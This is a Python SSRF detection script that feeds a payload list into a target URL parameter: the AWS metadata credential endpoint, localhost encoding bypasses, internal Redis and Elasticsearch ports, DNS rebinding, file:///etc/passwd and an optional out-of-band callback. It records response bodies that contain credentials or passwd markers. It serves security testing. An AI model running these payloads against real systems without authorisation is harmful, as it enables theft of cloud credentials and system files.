#!/usr/bin/env python3
"""
SSRF Detection Script.
Tests URL-accepting parameters with internal targets and OOB callbacks.

Usage:
  python3 ssrf.py --url "https://target.com/fetch?url={payload}" \
    --callback "https://your-webhook.site/ssrf" \
    --output results.json
"""
import argparse
import json
import os
import sys
import urllib.parse

sys.path.insert(0, os.path.dirname(__file__))
from client import make_request


def req(url, token=None, timeout=10):
    return make_request(url, method="GET", token=token,
                        truncate=2000, timeout=timeout)

def main():
    parser = argparse.ArgumentParser(description="SSRF Detection")
    parser.add_argument("--url", required=True, help="URL with {payload} placeholder")
    parser.add_argument("--token", default=None)
    parser.add_argument("--callback", default=None, help="OOB callback URL (webhook.site, interactsh)")
    parser.add_argument("--output", default=None)
    args = parser.parse_args()

    payloads = [
        # Cloud metadata
        ("AWS IMDSv1", "http://169.254.169.254/latest/meta-data/"),
        ("AWS IMDSv1 role", "http://169.254.169.254/latest/meta-data/iam/security-credentials/"),
        # IP bypasses
        ("Localhost decimal", "http://2130706433/"),
        ("Localhost hex", "http://0x7f000001/"),
        ("Localhost short", "http://127.1/"),
        ("Localhost IPv6", "http://[::1]/"),
        # Internal services
        ("Redis", "http://127.0.0.1:6379/"),
        ("Elasticsearch", "http://127.0.0.1:9200/"),
        # DNS tricks
        ("DNS rebind", "http://127.0.0.1.nip.io/"),
        # Protocol
        ("File", "file:///etc/passwd"),
    ]

    if args.callback:
        payloads.insert(0, ("OOB callback", args.callback))

    results = {"target": args.url, "findings": [], "summary": {"hits": 0, "blocked": 0}}

    for name, payload in payloads:
        encoded = urllib.parse.quote(payload, safe="")
        test_url = args.url.replace("{payload}", encoded)
        resp = req(test_url, token=args.token)

        finding = {"test": name, "payload": payload, "status": resp["status"]}

        # Check for SSRF indicators in response
        body = resp.get("body", "")
        indicators = [
            "ami-id", "instance-id", "security-credentials",  # AWS metadata
            "root:x:0:0", "/bin/bash",  # /etc/passwd
            "redis_version", "REDIS",  # Redis
            "cluster_name", "elasticsearch",  # ES
            "200 OK",  # successful internal request
        ]

        hit = False
        for indicator in indicators:
            if indicator.lower() in body.lower():
                finding["result"] = "VULNERABLE"
                finding["detail"] = f"SSRF confirmed! Found '{indicator}' in response"
                finding["evidence"] = body[:500]
                finding["severity"] = "CRITICAL" if "credentials" in indicator or "passwd" in indicator else "HIGH"
                results["summary"]["hits"] += 1
                hit = True
                break

        if not hit:
            if resp["status"] and resp["status"] < 400 and len(body) > 50:
                finding["result"] = "NEEDS_REVIEW"
                finding["detail"] = f"Got {resp['status']} with content — check manually"
                finding["evidence"] = body[:200]
            else:
                finding["result"] = "BLOCKED"
                finding["detail"] = f"Status: {resp['status']}"
                results["summary"]["blocked"] += 1

        results["findings"].append(finding)

    output = json.dumps(results, indent=2)
    print(output)
    if args.output:
        with open(args.output, "w") as f:
            f.write(output)

if __name__ == "__main__":
    main()
